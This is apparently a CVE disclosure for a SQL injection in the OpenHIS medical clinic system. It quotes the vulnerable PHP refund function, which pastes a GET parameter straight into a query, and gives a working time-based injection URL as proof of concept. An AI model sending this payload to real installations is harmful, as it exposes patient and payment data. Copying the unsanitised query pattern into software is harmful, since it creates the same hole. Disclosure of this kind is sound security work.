# CVE number:
CVE-2024-46532

# vendor:
上海顶想信息科技有限公司(https://www.kancloud.cn/)

# product:
互联网医疗系统(医疗门诊OpenHIS)

# version:
V1.0

# affected component:
https://github.com/1638824607/OpenHIS?tab=readme-ov-file

# Reproduction of SQL Injection Vulnerabilities in OpenHIS

# Vulnerabilities：
OpenHIS-master/Application/His/Controller/PayController.class.php

# Vulnerability code：
    public function refund()
    {
        $paylog_id = I('get.paylog_id',0);
    
        $amount = I('post.amount','all');//all就是是全部
        $adm_uid = I('post.adm_uid',0);//all就是是全部
        $adm_memo = I('post.adm_memo','退款');//all就是是全部
    
        if(!$paylog_id||!$amount)$this->resJSON(1,'参数缺失:paylog_id or amount');
    
        #todo 这里需要添加功能权限，无权限不能使用
    
        $sql = "SELECT a.*,b.hospital_id,b.type_id,b.order_code,b.ol_pay_part,b.amount,b.patient_id FROM ".$this->tab_pre."his_care_paylog a LEFT JOIN ".$this->tab_pre."his_care_pkg b ON a.pkg_id=b.id WHERE a.id='$paylog_id' LIMIT 1";
    
        $r = $this->db->query($sql);
        if(!$r)$this->resJSON(2,'paylog_id无效',$sql);

# POC:
  /index.php/pay/refund?paylog_id=aaaa'+or+sleep(.6)+--+

